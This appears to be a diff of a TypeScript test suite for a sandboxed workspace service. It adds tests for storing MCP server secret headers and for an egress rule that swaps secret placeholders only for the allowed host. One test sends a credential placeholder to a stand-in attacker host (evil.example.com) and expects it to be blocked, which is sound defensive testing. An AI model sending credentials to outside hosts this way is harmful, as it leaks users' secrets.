@@ -2324,6 +2324,156 @@ describe("authenticated attachment reads", () => {
 });
 
 // ======================================================================
+// 02, MCP servers; 01, User MCP servers and TempoOutbound rule 12
+// ======================================================================
+
+describe("MCP servers (02, MCP servers; 01, User MCP servers)", () => {
+  const linear = {
+    name: "linear",
+    enabled: true,
+    transport: "http",
+    url: "https://mcp.linear.app/mcp",
+    headers: [
+      { name: "Authorization", secret: true, value: "Bearer lin_secret" },
+      { name: "X-Team", secret: false, value: "core" },
+    ],
+  };
+
+  it("saveMcpServer stores secret headers only in CredentialDO and never returns them", async () => {
+    const o = await owner();
+    const saved = ok(await call("saveMcpServer", o, linear));
+    expect(saved.id).toMatch(ULID);
+    expect(saved.headers).toEqual([
+      { name: "Authorization", secret: true, value: null, set: true },
+      { name: "X-Team", secret: false, value: "core" },
+    ]);
+    const row = await d1Row("SELECT * FROM mcp_servers WHERE id = ?", saved.id);
+    expect(row!["headers_json"]).not.toContain("lin_secret");
+    const creds = env.CREDENTIALS.getByName(o.userId);
+    expect(await creds.getSecret(`mcp.${saved.id}.header.authorization`)).toBe("Bearer lin_secret");
+    expect(ok(await call("listMcpServers", o))).toEqual([saved]);
+  });
+
+  it("an empty secret value keeps the stored value; dropping the header deletes it", async () => {
+    const o = await owner();
+    const saved = ok(await call("saveMcpServer", o, linear));
+    const creds = env.CREDENTIALS.getByName(o.userId);
+    const keep = {
+      ...linear,
+      id: saved.id,
+      enabled: false,
+      headers: [{ name: "Authorization", secret: true }],
+    };
+    expect(ok(await call("saveMcpServer", o, keep)).enabled).toBe(false);
+    expect(await creds.getSecret(`mcp.${saved.id}.header.authorization`)).toBe("Bearer lin_secret");
+    ok(await call("saveMcpServer", o, { ...linear, id: saved.id, headers: [] }));
+    expect(await creds.getSecret(`mcp.${saved.id}.header.authorization`)).toBeNull();
+  });
+
+  it("returns VALIDATION_FAILED for bad input", async () => {
+    const o = await owner();
+    const bad = [
+      { ...linear, name: "Linear" },
+      { ...linear, name: "playwright" },
+      { ...linear, url: "http://mcp.linear.app/mcp" },
+      { ...linear, headers: [{ name: "Authorization", secret: true }] },
+      { ...linear, headers: [{ name: "Host", secret: false, value: "x" }] },
+      { name: "fs", enabled: true, transport: "stdio" },
+      { name: "fs", enabled: true, transport: "stdio", command: "npx", url: "https://x.test" },
+      {
+        name: "fs",
+        enabled: true,
+        transport: "stdio",
+        command: "npx",
+        env: [{ name: "bad-name", value: "v" }],
+      },
+    ];
+    for (const input of bad)
+      expect(codeOf(await call("saveMcpServer", o, input)), JSON.stringify(input)).toBe("VALIDATION_FAILED");
+    ok(await call("saveMcpServer", o, linear));
+    expect(codeOf(await call("saveMcpServer", o, linear))).toBe("VALIDATION_FAILED");
+  });
+
+  it("servers belong to one user: another user cannot see, edit or delete them", async () => {
+    const o = await owner();
+    const other = await owner();
+    const saved = ok(await call("saveMcpServer", o, linear));
+    expect(ok(await call("listMcpServers", other))).toEqual([]);
+    expect(codeOf(await call("saveMcpServer", other, { ...linear, id: saved.id }))).toBe("NOT_FOUND");
+    ok(await call("deleteMcpServer", other, { id: saved.id }));
+    expect(ok(await call("listMcpServers", o))).toHaveLength(1);
+  });
+
+  it("deleteMcpServer removes the row and its secrets", async () => {
+    const o = await owner();
+    const saved = ok(await call("saveMcpServer", o, linear));
+    ok(await call("deleteMcpServer", o, { id: saved.id }));
+    expect(ok(await call("listMcpServers", o))).toEqual([]);
+    expect(
+      await env.CREDENTIALS.getByName(o.userId).getSecret(`mcp.${saved.id}.header.authorization`),
+    ).toBeNull();
+  });
+
+  it("session.start carries enabled servers, with placeholders for secret headers", async () => {
+    const o = await owner();
+    await seedCredentials(o.userId);
+    const saved = ok(await call("saveMcpServer", o, linear));
+    ok(
+      await call("saveMcpServer", o, {
+        name: "fs",
+        enabled: true,
+        transport: "stdio",
+        command: "npx",
+        args: ["-y", "server-fs"],
+        env: [{ name: "ROOT", value: "/workspace" }],
+      }),
+    );
+    ok(await call("saveMcpServer", o, { ...linear, name: "off", enabled: false }));
+    const { stub, tempod } = await seedWorkspace(o, { prompt: "hi" });
+    await driveReady(stub);
+    await waitFor(() => tempod.requestsOf("session.start").length > 0, 5000, "session.start");
+    expect(tempod.requestsOf("session.start")[0].mcpServers).toEqual([
+      {
+        name: "fs",
+        transport: "stdio",
+        command: "npx",
+        args: ["-y", "server-fs"],
+        env: [{ name: "ROOT", value: "/workspace" }],
+      },
+      {
+        name: "linear",
+        transport: "http",
+        url: "https://mcp.linear.app/mcp",
+        headers: [
+          { name: "Authorization", value: `${PLACEHOLDER}:mcp:${saved.id}:authorization` },
+          { name: "X-Team", value: "core" },
+        ],
+      },
+    ]);
+  });
+
+  it("TempoOutbound rule 12 swaps the secret header for the server host only", async () => {
+    const o = await owner({ settingsJson: JSON.stringify({ environment: { egress_policy: "allowlist" } }) });
+    const saved = ok(await call("saveMcpServer", o, linear));
+    const { workspaceId } = await seedWorkspace(o);
+    const placeholder = `${PLACEHOLDER}:mcp:${saved.id}:authorization`;
+    const before = gh.upstream.length;
+    const res = await outbound(workspaceId, o.userId).fetch("https://mcp.linear.app/mcp", {
+      method: "POST",
+      headers: { Authorization: placeholder },
+      body: "{}",
+    });
+    expect(res.status).toBe(200);
+    const sent = gh.upstream.slice(before).find((r) => r.url.hostname === "mcp.linear.app");
+    expect(sent?.headers.get("Authorization")).toBe("Bearer lin_secret");
+    const leak = await outbound(workspaceId, o.userId).fetch("https://evil.example.com/", {
+      headers: { Authorization: placeholder },
+    });
+    expect(leak.status).toBe(403);
+  });
+});
+
+// ======================================================================
 // 01, Environments; 02, Environments server functions
 // ======================================================================
 
@@ -2545,8 +2695,8 @@ const sha256 = async (text: string): Promise<string> =>
     .map((b) => b.toString(16).padStart(2, "0"))
     .join("");
 
-describe("TempoOutbound rules 12 and 13 (01, Environments)", () => {
-  it("rule 13 swaps a bound secret in a header, the query and Basic auth, and logs rule 13", async () => {
+describe("TempoOutbound rules 13 and 14 (01, Environments)", () => {
+  it("rule 14 swaps a bound secret in a header, the query and Basic auth, and logs rule 14", async () => {
     const o = await ownerWithEnvironment(
       { secrets: [{ name: "STRIPE_KEY", hosts: ["api.stripe.com"] }] },
       { STRIPE_KEY: "sk_live_3" },
@@ -2568,7 +2718,7 @@ describe("TempoOutbound rules 12 and 13 (01, Environments)", () => {
     const sentBasic = gh.upstream.at(-1)!;
     expect(atob(sentBasic.headers.get("Authorization")!.replace("Basic ", ""))).toBe("sk_live_3:");
     await waitFor(async () => (await egressRows(stub)).length >= 2, 5000, "egress rows");
-    expect((await egressRows(stub)).map((r) => r["rule"])).toEqual([13, 13]);
+    expect((await egressRows(stub)).map((r) => r["rule"])).toEqual([14, 14]);
   });
 
   it("refuses a placeholder for another host, an unset value, or an unknown name (rule 7)", async () => {
@@ -2598,7 +2748,7 @@ describe("TempoOutbound rules 12 and 13 (01, Environments)", () => {
     expect((await egressRows(stub)).map((r) => r["rule"])).toEqual([7, 7, 7]);
   });
 
-  it("rule 12 runs the injector: it gets an HMAC, its placeholders are swapped, and it cannot leave its hosts", async () => {
+  it("rule 13 runs the injector: it gets an HMAC, its placeholders are swapped, and it cannot leave its hosts", async () => {
     const o = await ownerWithEnvironment(
       {
         secrets: [{ name: "SIGN_KEY", hosts: ["signed.example"] }],
@@ -2623,6 +2773,6 @@ describe("TempoOutbound rules 12 and 13 (01, Environments)", () => {
     expect(thrown.status).toBe(502);
     expect(await thrown.text()).toBe("tempo: injector sign failed");
     await waitFor(async () => (await egressRows(stub)).length >= 5, 5000, "egress rows");
-    expect(new Set((await egressRows(stub)).map((r) => r["rule"]))).toEqual(new Set([12, 13]));
+    expect(new Set((await egressRows(stub)).map((r) => r["rule"]))).toEqual(new Set([13, 14]));
   });
 });
